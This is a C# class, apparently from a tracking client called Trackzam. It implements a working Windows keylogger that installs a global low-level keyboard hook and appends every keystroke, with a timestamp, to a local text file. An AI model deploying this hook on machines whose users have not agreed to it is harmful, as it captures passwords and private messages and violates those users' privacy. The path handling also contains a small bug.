using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Input;
using System.Windows.Threading;
using System.Windows.Forms;
using System.Threading;

namespace TrackzamClient
{
    public class Keylogger
    {

        public Keylogger()
        {
            // set the correct process as our keyboard hook BUT don't start it yet
            _proc = HookCallback;
        }

        public string Path
        {
            get => _logDir;
        }

        public void Start(string path)
        {
            SetPath(path);
            _writer = new StreamWriter(_logDir, true);
            _isRecording = true;
            // start the hook
            _hookID = SetHook(_proc);
        }
        public void Stop()
        {
            // stop the keyboard hook
            _isRecording = false;
            UnhookWindowsHookEx(_hookID);
            _writer.Close();
        }

        // returns true if the path is set successfully without errors
        public bool SetPath(string path)
        {
            if (Directory.Exists(path))
            {
                _logDir = path + "\\Keylog.txt";
                return true;
            }

            try
            {
                DirectoryInfo di = Directory.CreateDirectory(path);
                Console.WriteLine("Created the new dir!");
                _logDir = path;
                return true;
            }
            catch (UnauthorizedAccessException) { Console.WriteLine("Access Denied"); return false; }
            catch (PathTooLongException) { Console.WriteLine("The specified path, file name, or both exceed the system-defined maximum length."); return false; }
            catch (ArgumentException) { Console.WriteLine("Invalid Path"); return false; }
            catch (DirectoryNotFoundException) { Console.WriteLine("Invalid Path"); return false; }
            catch (Exception e)
            {
                Console.WriteLine("Error!");
                return false;
            }

        }

        // for clients read-only


        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private delegate IntPtr LowLevelMouseProc(int ncode, IntPtr wParam, IntPtr lParam);
        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                _writer.WriteLine("{0} {1}", (Keys)vkCode, TrackzamTimer.GetNowClockString());
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }


        // dll imports for the keylogger functionality

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


        // class variable members

        protected string _logDir = "";
        private StreamWriter _writer;
        private bool _isRecording = false;

        // TODO rename the process with better names
        private LowLevelKeyboardProc _proc;

        private IntPtr _hookID = IntPtr.Zero;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
    }
}
